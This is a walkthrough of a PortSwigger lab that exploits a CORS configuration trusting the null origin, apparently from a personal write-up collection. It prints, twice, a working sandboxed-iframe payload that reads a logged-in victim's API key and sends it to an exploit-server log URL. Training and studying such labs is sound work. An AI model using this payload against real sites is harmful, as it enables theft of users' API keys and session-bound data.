# Writeup for PortSwigger CORS Lab: Insecure Null Origin

## Steps Followed to Solve the Lab

### 1. **Initial Reconnaissance**
   - Turned off Burp intercept and logged into the lab using the provided credentials:
     ```
     Username: wiener
     Password: peter
     ```
   - Navigated to the **My Account** page and observed that the API key was retrieved using an AJAX request to the `/accountDetails` endpoint.
   - Analyzed the response headers and noted the presence of the `Access-Control-Allow-Credentials` header, which indicated potential support for CORS.

### 2. **Testing with the Null Origin**
   - Sent the `/accountDetails` request to Burp Repeater and modified the request to include the following header:
     ```
     Origin: null
     ```
   - Resubmitted the request and observed that the `Access-Control-Allow-Origin` header reflected the `null` origin, confirming an insecure CORS configuration.

### 3. **Crafting the Exploit**
   - Navigated to the exploit server and crafted an exploit payload using an iframe sandbox to generate a `null` origin request. The payload was as follows:
     ```html
     <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
         req.open('get', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
         req.withCredentials = true;
         req.send();

         function reqListener() {
             location = 'YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
         };
     </script>"></iframe>
     ```
     - Replaced `YOUR-LAB-ID` with the unique lab ID.
     - Replaced `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID.

### 4. **Testing the Exploit**
   - Clicked **View exploit** to test the payload.
   - Verified that the exploit worked by observing that the API key appeared in the URL of the log page.

### 5. **Delivering the Exploit**
   - Returned to the exploit server and clicked **Deliver exploit to victim**.

### 6. **Retrieving the Victim's API Key**
   - Clicked **Access log** on the exploit server.
   - Retrieved the victim's API key from the logs.
   - Submitted the key to complete the lab.

## Observations
- The lab demonstrated a vulnerability caused by an insecure CORS configuration, where the server incorrectly trusted the `null` origin.
- Using the iframe sandbox allowed the request to originate from a `null` origin, enabling exploitation.

## Conclusion
This lab highlights the importance of properly configuring CORS policies to avoid unintended trust of insecure origins like `null`. Servers should avoid reflecting arbitrary origins in the `Access-Control-Allow-Origin` header when `Access-Control-Allow-Credentials` is enabled.

## PoC Code
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = 'YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
![Basic Origin Reflection Attack Lab 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab2a.PNG)

API Key Decoded

![Basic Origin Reflection Attack Lab 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab2b.PNG)

My Final POC
![Basic Origin Reflection Attack Lab 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab2c.PNG)
